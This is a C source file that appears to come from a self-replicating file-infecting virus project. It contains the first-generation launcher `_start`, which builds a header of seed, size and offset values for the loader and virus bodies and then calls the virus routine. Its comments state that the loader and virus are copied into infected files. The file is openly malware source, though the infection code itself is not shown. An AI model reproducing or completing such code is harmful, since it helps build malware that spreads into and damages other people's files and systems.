
#include "syscall.h"
#include "virus.h"
#include "loader.h"

/*
** _start is the launcher function of the virus
**   - it is launched instead of the loader for the first run
**   - it is NOT copied into infected files (unlike the loader and virus)
*/

extern size_t _full_virus_size;

void	_start(void)
{
	/* 1st generation values */
	struct virus_header	vhdr = {
		.seed                = 0xfadedbade1f5eed5,
		.full_virus_size     = (size_t)_start - (size_t)loader_entry,
		.loader_entry        = loader_entry,
		.loader_size         = (size_t)loader_exit - (size_t)loader_entry,
		.dist_virus_loader   = (size_t)virus - (size_t)loader_entry,
		.dist_vircall_loader = (size_t)call_virus - (size_t)loader_entry,
		.dist_header_loader  = (size_t)virus_header_struct - (size_t)loader_entry
	};

	virus(&vhdr);

	sys_exit(0);
	__builtin_unreachable();
}
